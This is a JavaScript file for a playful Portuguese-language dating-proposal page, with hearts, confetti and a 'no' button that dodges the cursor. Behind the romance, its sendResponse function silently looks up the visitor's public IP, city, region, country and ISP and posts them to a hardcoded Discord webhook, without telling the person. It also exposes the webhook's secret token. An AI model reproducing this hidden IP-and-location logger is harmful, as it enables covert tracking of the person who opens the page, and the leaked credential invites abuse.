document.addEventListener('DOMContentLoaded', () => {
    // DOM Elements
    const herPhoto = document.getElementById('her-photo');
    const photoInput = document.getElementById('photo-input');
    const yesBtn = document.querySelector('.yes-btn');
    const noBtn = document.querySelector('.no-btn');
    const maybeBtn = document.querySelector('.maybe-btn');
    const declaration = document.querySelector('.declaration');
    const closeBtn = document.querySelector('.close-btn');
    const floatingHearts = document.querySelector('.floating-hearts');

    // Discord Webhook
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1418342686498361446/eMZ5NmWZF57dcWWF0sVpG9YRV3JX3lovCmjOZV5oKxq4uF9LBPKBER7wt8qcRSk0PqPc';

    // --- Photo Upload ---
    photoInput.addEventListener('change', (e) => {
        if (e.target.files && e.target.files[0]) {
            const reader = new FileReader();
            reader.onload = (e) => {
                herPhoto.innerHTML = '';
                const img = document.createElement('img');
                img.src = e.target.result;
                img.style.cssText = 'width:100%;height:100%;object-fit:cover;border-radius:12px;';

                const overlay = document.createElement('div');
                overlay.className = 'photo-overlay';
                overlay.innerHTML = '<span>Clique para alterar</span>';

                herPhoto.append(img, overlay);
            };
            reader.readAsDataURL(e.target.files[0]);
        }
    });

    // --- Responses ---
    yesBtn.addEventListener('click', () => {
        declaration.classList.remove('hidden');
        createHearts();
        sendResponse('sim');
        createConfetti();
    });

    maybeBtn.addEventListener('click', () => {
        sendResponse('talvez');
        maybeBtn.style.transform = 'rotate(-5deg)';
        setTimeout(() => {
            maybeBtn.style.transform = 'rotate(5deg)';
            setTimeout(() => maybeBtn.style.transform = 'rotate(0deg)', 200);
        }, 200);
        setTimeout(() => alert('Que tal pensar um pouco mais? Eu espero sua resposta! 💖'), 400);
    });

    noBtn.addEventListener('mouseover', () => {
        const x = Math.random() * (window.innerWidth - noBtn.offsetWidth - 40);
        const y = Math.random() * (window.innerHeight - noBtn.offsetHeight - 40);
        noBtn.style.position = 'absolute';
        noBtn.style.left = x + 'px';
        noBtn.style.top = y + 'px';
    });

    noBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        sendResponse('não');
        document.body.style.filter = 'grayscale(30%)';
        setTimeout(() => {
            document.body.style.filter = 'none';
            alert('Você tem certeza? Pense bem... 😢');
        }, 1000);
    });

    closeBtn.addEventListener('click', () => declaration.classList.add('hidden'));

    // --- Floating Hearts ---
    function createHearts() {
        floatingHearts.innerHTML = '';
        const colors = ['#ff66a3', '#ff3385', '#ff99c1', '#ffb6d9'];
        for (let i = 0; i < 40; i++) {
            const heart = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
            heart.setAttribute('viewBox', '0 0 32 29.6');
            heart.classList.add('heart-svg');

            const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
            path.setAttribute('d', 'M23.6,0c-3.4,0-6.3,2.7-7.6,5.6C14.7,2.7,11.8,0,8.4,0C3.8,0,0,3.8,0,8.4c0,9.4,9.5,11.9,16,21.2c6.1-9.3,16-12.1,16-21.2C32,3.8,28.2,0,23.6,0z');
            heart.appendChild(path);

            const size = Math.random() * 25 + 15;
            heart.style.cssText = `
                width:${size}px;
                height:${size}px;
                left:${Math.random()*100}vw;
                animation-duration:${Math.random()*5 + 5}s;
                animation-delay:${Math.random()*5}s;
                fill:${colors[Math.floor(Math.random()*colors.length)]};
            `;
            floatingHearts.appendChild(heart);
        }
    }

    // --- Confetti ---
    function createConfetti() {
        const confettiContainer = document.createElement('div');
        confettiContainer.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;';
        document.body.appendChild(confettiContainer);

        const colors = ['#ff66a3','#ff3385','#ff99c1','#ffb6d9','#ffffff'];
        const shapes = ['circle','square','heart'];

        for(let i=0;i<150;i++){
            const confetti = document.createElement('div');
            const size = Math.random()*12 +5;
            const color = colors[Math.floor(Math.random()*colors.length)];
            const shape = shapes[Math.floor(Math.random()*shapes.length)];

            confetti.style.position='absolute';
            confetti.style.left = Math.random()*100 + 'vw';
            confetti.style.top = '-50px';
            confetti.style.opacity = Math.random();

            if(shape==='heart'){
                confetti.innerHTML = '❤️';
                confetti.style.fontSize=size+'px';
                confetti.style.width=size+'px';
                confetti.style.height=size+'px';
                confetti.style.backgroundColor='transparent';
            } else {
                confetti.style.width=size+'px';
                confetti.style.height=size+'px';
                confetti.style.backgroundColor=color;
                confetti.style.borderRadius = shape==='circle' ? '50%' : '2px';
            }

            confettiContainer.appendChild(confetti);

            const anim = confetti.animate([
                {top:'-50px', transform:'rotate(0deg)'},
                {top:Math.random()*100+50+'vh', transform:`rotate(${Math.random()*720}deg)`}
            ], {duration:Math.random()*3000+2000, easing:'cubic-bezier(0.1,0.8,0.3,1)'});

            anim.onfinish = () => {
                confetti.remove();
                if(confettiContainer.children.length===0) confettiContainer.remove();
            };
        }
    }

    // --- Send response com IP e localização ---
    function sendResponse(response) {
        // Primeiro busca o IP público IPv4 usando ipify
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(ipData => {
                const ip = ipData.ip;

                // Depois busca localização e outros dados pelo ipapi
                fetch('https://ipapi.co/json/')
                    .then(res => res.json())
                    .then(data => {
                        const city = data.city || 'Desconhecida';
                        const region = data.region || 'Desconhecida';
                        const country = data.country_name || 'Desconhecido';
                        const org = data.org || 'Desconhecida';

                        const locationString = `${city}, ${region}, ${country}`;

                        const payload = {
                            content: null,
                            embeds: [{
                                title: "> Pedido de Namoro!",
                                description: `Oi Vicky!\nEla respondeu: **${response.toUpperCase()}**`,
                                color: response === 'sim' ? 0xFF69B4 : response === 'talvez' ? 0xFFA500 : 0xFF4500,
                                fields: [
                                    {
                                        name: "> Data e Hora",
                                        value: new Date().toLocaleString('pt-BR'),
                                        inline: true
                                    },
                                    {
                                        name: "> IP",
                                        value: ip,
                                        inline: true
                                    },
                                    {
                                        name: "> Localização",
                                        value: locationString,
                                        inline: false
                                    },
                                    {
                                        name: "> Provedor (ISP)",
                                        value: org,
                                        inline: false
                                    },
                                    {
                                        name: "> Mensagem Especial",
                                        value:
                                            response === 'sim'
                                                ? "Estou super feliz! 😍"
                                                : response === 'talvez'
                                                ? "Vamos pensar juntos 💭"
                                                : "Tudo bem, sem problemas 💔",
                                        inline: false
                                    }
                                ],
                                thumbnail: {
                                    url: "https://cdn.discordapp.com/attachments/1418342607511228548/1418343348380373072/hellokitty8-removebg-preview.png"
                                },
                                footer: {
                                    text: "Pedido de Namoro • Isaac para Vicky",
                                    icon_url: "https://cdn.discordapp.com/attachments/1404154385180917881/1418334265610997893/e100e4dfc3b9b5369742060e99055a04.jpg"
                                }
                            }],
                            username: "Wowowowowow",
                            avatar_url: "https://cdn.discordapp.com/attachments/1418342607511228548/1418343348380373072/hellokitty8-removebg-preview.png"
                        };

                        fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(payload)
                        })
                            .then(res => {
                                if (res.ok) {
                                    console.log('Resposta, IP e localização enviados com sucesso!');
                                } else {
                                    console.error('Erro ao enviar:', res.status);
                                }
                            })
                            .catch(err => console.error('Erro ao enviar para o Discord:', err));

                        localStorage.setItem('respostaNamoro', response);
                    })
                    .catch(err => console.error('Erro ao obter localização:', err));
            })
            .catch(err => console.error('Erro ao obter IP:', err));
    }

    // NÃO mostramos a declaração automaticamente mais!

    createHearts();
});
